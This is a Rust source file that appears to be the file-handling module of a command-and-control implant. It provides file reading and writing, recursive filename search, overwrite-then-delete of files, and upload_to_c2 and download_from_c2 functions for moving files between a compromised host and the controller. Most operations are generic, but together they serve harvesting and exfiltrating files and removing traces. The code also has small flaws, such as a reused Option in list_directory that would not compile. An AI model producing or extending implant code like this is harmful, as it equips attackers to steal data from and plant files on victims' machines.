use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

pub struct FileOperations;

impl FileOperations {
    /// Read entire file into memory
    pub fn read_file(path: &str) -> io::Result<Vec<u8>> {
        let mut file = File::open(path)?;
        let mut contents = Vec::new();
        file.read_to_end(&mut contents)?;
        Ok(contents)
    }
    
    /// Write data to file
    pub fn write_file(path: &str, data: &[u8]) -> io::Result<()> {
        let mut file = File::create(path)?;
        file.write_all(data)?;
        Ok(())
    }
    
    /// Append data to file
    pub fn append_file(path: &str, data: &[u8]) -> io::Result<()> {
        use std::fs::OpenOptions;
        
        let mut file = OpenOptions::new()
            .append(true)
            .create(true)
            .open(path)?;
        file.write_all(data)?;
        Ok(())
    }
    
    /// Delete file securely (overwrite before delete)
    pub fn delete_file_secure(path: &str) -> io::Result<()> {
        let metadata = fs::metadata(path)?;
        let size = metadata.len() as usize;
        
        // Overwrite with random data
        let random_data: Vec<u8> = (0..size).map(|_| rand::random::<u8>()).collect();
        Self::write_file(path, &random_data)?;
        
        // Overwrite with zeros
        let zeros = vec![0u8; size];
        Self::write_file(path, &zeros)?;
        
        // Finally delete
        fs::remove_file(path)?;
        Ok(())
    }
    
    /// List directory contents
    pub fn list_directory(path: &str) -> io::Result<Vec<String>> {
        let entries = fs::read_dir(path)?
            .filter_map(|entry| entry.ok())
            .map(|entry| {
                let path = entry.path();
                let name = path.file_name().unwrap().to_string_lossy().to_string();
                let metadata = entry.metadata().ok();
                let size = metadata.map(|m| m.len()).unwrap_or(0);
                let is_dir = metadata.map(|m| m.is_dir()).unwrap_or(false);
                
                if is_dir {
                    format!("[DIR] {}", name)
                } else {
                    format!("{} ({} bytes)", name, size)
                }
            })
            .collect();
        
        Ok(entries)
    }
    
    /// Get file metadata
    pub fn file_info(path: &str) -> io::Result<String> {
        let metadata = fs::metadata(path)?;
        
        let file_type = if metadata.is_dir() {
            "Directory"
        } else if metadata.is_file() {
            "File"
        } else {
            "Other"
        };
        
        let size = metadata.len();
        let readonly = metadata.permissions().readonly();
        
        Ok(format!(
            "Type: {}\nSize: {} bytes\nReadonly: {}\n",
            file_type, size, readonly
        ))
    }
    
    /// Copy file
    pub fn copy_file(src: &str, dest: &str) -> io::Result<()> {
        fs::copy(src, dest)?;
        Ok(())
    }
    
    /// Move/rename file
    pub fn move_file(src: &str, dest: &str) -> io::Result<()> {
        fs::rename(src, dest)?;
        Ok(())
    }
    
    /// Create directory (recursively)
    pub fn create_directory(path: &str) -> io::Result<()> {
        fs::create_dir_all(path)?;
        Ok(())
    }
    
    /// Search for files by pattern
    pub fn search_files(base_path: &str, pattern: &str) -> io::Result<Vec<PathBuf>> {
        let mut results = Vec::new();
        Self::search_files_recursive(Path::new(base_path), pattern, &mut results)?;
        Ok(results)
    }
    
    fn search_files_recursive(dir: &Path, pattern: &str, results: &mut Vec<PathBuf>) -> io::Result<()> {
        if dir.is_dir() {
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                
                if path.is_dir() {
                    Self::search_files_recursive(&path, pattern, results)?;
                } else {
                    let filename = path.file_name()
                        .and_then(|n| n.to_str())
                        .unwrap_or("");
                    
                    if filename.contains(pattern) {
                        results.push(path);
                    }
                }
            }
        }
        Ok(())
    }
    
    /// Download file from agent to C2
    pub fn upload_to_c2(path: &str) -> io::Result<Vec<u8>> {
        Self::read_file(path)
    }
    
    /// Receive file from C2 and save
    pub fn download_from_c2(data: &[u8], dest_path: &str) -> io::Result<()> {
        Self::write_file(dest_path, data)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_file_operations() {
        let test_file = "/tmp/test_c2.txt";
        let test_data = b"test data";
        
        FileOperations::write_file(test_file, test_data).unwrap();
        let read_data = FileOperations::read_file(test_file).unwrap();
        
        assert_eq!(test_data, &read_data[..]);
        
        fs::remove_file(test_file).ok();
    }
}
